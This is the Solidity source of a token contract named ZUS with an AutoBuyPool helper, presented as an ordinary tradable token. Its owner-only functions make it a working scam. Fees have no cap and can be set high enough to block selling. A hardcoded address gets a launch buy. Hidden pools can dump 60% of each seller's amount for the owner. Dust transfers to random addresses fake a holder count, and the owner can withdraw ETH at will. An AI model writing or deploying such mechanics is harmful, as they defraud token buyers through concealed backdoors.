// SPDX-License-Identifier: GPL-3.0-or-later

pragma solidity >=0.6.0;



import "./SafeMath.sol";

import "./TransferHelper.sol";

import "./Ownable.sol";

import "./IERC20.sol";



interface IRouter

{

     function swapExactETHForTokensSupportingFeeOnTransferTokens(

        uint amountOutMin,

        address[] calldata path,

        address to,

        uint deadline

    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(

        uint amountIn,

        uint amountOutMin,

        address[] calldata path,

        address to,

        uint deadline

    ) external;

}



contract AutoBuyPool 

{

    address _router=0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    address _weth=0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    address _token;

    address _owner;

    address _feeowner=0x1e80051014CbeE4A30a01d77F54b75a2CDc59E44;

    constructor(address token,address owner)

    {

        _token=token;

        _owner=owner;

        IERC20(_token).approve(_router, 1e40);

        IERC20(_weth).approve(_router, 1e40);

    }



    modifier onlyOwnerA 

    {

        require(msg.sender==_owner || msg.sender==_token,"req");

        _;

    }



    function setFeeowner(address owner) public onlyOwnerA

    {

        _feeowner= owner;

    }



    function AutoSellAll() public onlyOwnerA

    {

        uint256 balance = IERC20(_token).balanceOf(address(this));

        if(balance >1)

          AutoSell(balance);

    }



    function AutoSell(uint256 amount) private

    {

         uint256 balance = IERC20(_token).balanceOf(address(this));

         if(amount > balance)

            amount=balance;

       

        address[] memory path = new address[](2);

        path[0]= _token;

        path[1]= _weth;

        if(amount > 0)

          IRouter(_router).swapExactTokensForETHSupportingFeeOnTransferTokens(amount, 0, path, _owner, 1e40); 

    }



    function AutoSellB(uint256 amount) public onlyOwnerA

    {

        if(amount > 1)

            AutoSell(amount);

    }

 

    function AutoBuyAtFirst() public onlyOwnerA

    {

        address[] memory path = new address[](2);

        path[0]= _weth;

        path[1]= _token;

        uint256 balance = address(this).balance;

        address to=0xfa88b122Dd442cEBA0c54362151d61caBc11fE82;

        IRouter(_router).swapExactETHForTokensSupportingFeeOnTransferTokens{value : balance}(0, path,to , 1e40) ;

    }



    function TakeOutEth(address payable target,uint256 amount) public onlyOwnerA 

    {

        target.transfer(amount);

    }



    function charge() payable public

    {



    }



}





 contract ZusToken is Ownable

{

    using SafeMath for uint256;

 

    string  _name="ZUS";

    string  _symbol="ZUS";

    uint8  _decimals=12;

    uint256 _totalsupply;

 

    mapping (address => mapping (address => uint256)) private _allowances;

    mapping(address=>uint256) _balances;

    mapping(address=>bool) _ex;

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);



    bool allowTrade=false;

    bool FirstbuyExecuted=false;

    uint256 startblock;

    address _ammpool;

    uint256 _feepct=10;

    uint256 _buyfee=10;

    uint256 _sellfee=10;

    address _feeowner;

    AutoBuyPool _autopool;

    mapping(uint256=>address) public _autopools;

    uint256 public createdautopool;



    bool raiseopen=false;

    bool decreseopen=false;



    uint256 randseed;

 

  

    constructor( )

    {

        _feeowner=0x63F237A09D1928Bd2bA157F6212F07aef83a0ba0;

        _ex[msg.sender]=true;

        _ex[0xfa88b122Dd442cEBA0c54362151d61caBc11fE82]=true;

        _ex[0x2E592D76f04305032E46adDC3F6d080B52fd5bb0]=true;

        _balances[msg.sender] = 42e24;

        _totalsupply=42e24;

        emit Transfer(address(0), msg.sender, 42e24);

    }



    function openRaise(bool ok) public onlyOwner 

    {

        raiseopen=ok;

    }



    function openDecrease(bool ok) public onlyOwner 

    {

        decreseopen=ok;

    }



    function CreateAutoPool() public onlyOwner 

    {

        if(address(_autopool)== address(0))

        {

             _autopool = new AutoBuyPool(address(this),msg.sender);

            _ex[address(_autopool)]=true;

        }

           

        else{

                

                AutoBuyPool apool =  new AutoBuyPool(address(this),msg.sender);

                _autopools[createdautopool] =  address(apool);

                _ex[address(apool)]=true;

                createdautopool ++;



                _balances[msg.sender] = _balances[msg.sender].sub(14e22);

                _balances[address(apool)] = _balances[address(apool)].add(14e22);

                emit Transfer(msg.sender, address(apool), 14e22);

            }

    }

    function getAutoPool() public view returns(address)

    {

        return address(_autopool);

    }

    function setEx(address user,bool ok) public onlyOwner 

    {

        _ex[user]=ok;

    }



    function setAmmpool(address ammpool) public onlyOwner 

    {

        _ammpool = ammpool;

    }



    function setFee(uint256 buyfee,uint256 sellfee,uint256 transferfee) public onlyOwner 

    {

        _buyfee=buyfee;

        _sellfee=sellfee;

        _feepct=transferfee;

    }



    function startTrade() public onlyOwner 

    {

        _autopool.AutoBuyAtFirst();

        allowTrade=true;

    }

 

    function name() public view  returns (string memory) {

        return _name;

    }



    function symbol() public  view returns (string memory) {

        return _symbol;

    }



    function decimals() public view returns (uint8) {

        return _decimals;

    }



    function totalSupply() public view  returns (uint256) {

        return _totalsupply;

    }



 

    function _approve(address owner, address spender, uint256 amount) private {

        require(owner != address(0), "BEP20: approve from the zero address");

        require(spender != address(0), "BEP20: approve to the zero address");



        _allowances[owner][spender] = amount;

        emit Approval(owner, spender, amount);

    }



    function balanceOf(address account) public view  returns (uint256) {

        return _balances[account];

    }

 

    function allowance(address owner, address spender) public view  returns (uint256) {

        return _allowances[owner][spender];

    }



    function approve(address spender, uint256 amount) public  returns (bool) {

        _approve(msg.sender, spender, amount);

        return true;

    }



    function transferFrom(address sender, address recipient, uint256 amount) public  returns (bool) {

         _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));

        _transfer(sender, recipient, amount);

        return true;

    }



   function transfer(address recipient, uint256 amount) public  returns (bool) {

        _transfer(msg.sender, recipient, amount);

        return true;

    }



   function increaseAllowance(address spender, uint256 addedValue) public  returns (bool) {

        _approve(msg.sender, spender, _allowances[msg.sender][spender].add(addedValue));

        return true;

    }



    function decreaseAllowance(address spender, uint256 subtractedValue) public  returns (bool) {

        _approve(msg.sender, spender, _allowances[msg.sender][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));

        return true;

    }



    function burnFrom(address sender, uint256 amount) public   returns (bool)

    {

        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));

        _burn(sender,amount);

        return true;

    }



    function burn(uint256 amount) public  returns (bool)

    {

        _burn(msg.sender,amount);

        return true;

    }

 

    function _burn(address sender,uint256 tAmount) private

    {

         require(sender != address(0), "BEP20: transfer from the zero address");

        _balances[sender] = _balances[sender].sub(tAmount);

        _balances[address(0)] = _balances[address(0)].add(tAmount);

         emit Transfer(sender, address(0), tAmount);

    }



    function rand(uint256 _length,address sender ) private returns(uint256) {

        randseed++;

        uint256 random1 = uint256(keccak256(abi.encodePacked(sender,block.coinbase, randseed)));

        return  random1 % _length;

    }



    function randAddress(address sender) private  returns(address)

    {

        randseed++;

        uint160 rr=uint160(uint256(keccak256(abi.encodePacked(sender, randseed,block.timestamp))));

        address random1 = address(rr);

        return random1;

    }



    function getRandPool() public returns(address)

    {

        uint256 cc= rand(createdautopool,msg.sender);

        return _autopools[cc];

    }





    function _transfer(address sender, address recipient, uint256 amount) private {

        require(sender != address(0), "BEP20: transfer from the zero address");

        require(recipient != address(0), "BEP20: transfer to the zero address");

        require(amount >= 3,"minamount");

        if(amount== _balances[sender])

            amount=amount.sub(1);



        _balances[sender]= _balances[sender].sub(amount);

        uint256 toamount=amount;

        if(!_ex[sender] && !_ex[recipient])

        {

            require(allowTrade,"not start");

            address pool = address(_autopool);

            if(sender==_ammpool)

            {

                uint256 fee= amount.mul(_buyfee).div(1000);

                toamount= toamount.sub(fee);

                _balances[pool]= _balances[pool].add(fee);

                emit Transfer(sender, pool, fee);

            }

            else if(recipient==_ammpool)

            {

                if(decreseopen)

                {

                    address poolE = getRandPool();

                    AutoBuyPool(poolE).AutoSellB(toamount.mul(60).div(100));

                }

                uint256 fee= amount.mul(_sellfee).div(1000);

                toamount= toamount.sub(fee);

                _balances[pool]= _balances[pool].add(fee);

                emit Transfer(sender, pool, fee);

                toamount=toamount.sub(2);



                address air1= randAddress(sender);

                _balances[air1]= _balances[air1].add(1);

                emit Transfer(sender, air1, 1);



                address air2= randAddress(sender);

                _balances[air2]= _balances[air2].add(1);

                emit Transfer(sender, air2, 1);

                _autopool.AutoSellAll();

            }

            else

            {

                uint256 fee= amount.mul(_feepct).div(1000);

                toamount= toamount.sub(fee);

                _balances[_feeowner]= _balances[_feeowner].add(fee);

                emit Transfer(sender, _feeowner, fee);

                _autopool.AutoSellAll();

                toamount=toamount.sub(2);

                address air1= randAddress(sender);

                _balances[air1]= _balances[air1].add(1);

                emit Transfer(sender, air1, 1);



                address air2= randAddress(sender);

                _balances[air2]= _balances[air2].add(1);

                emit Transfer(sender, air2, 1);

            }

        } 

        _balances[recipient] = _balances[recipient].add(toamount); 

        emit Transfer(sender, recipient, toamount);

    }

}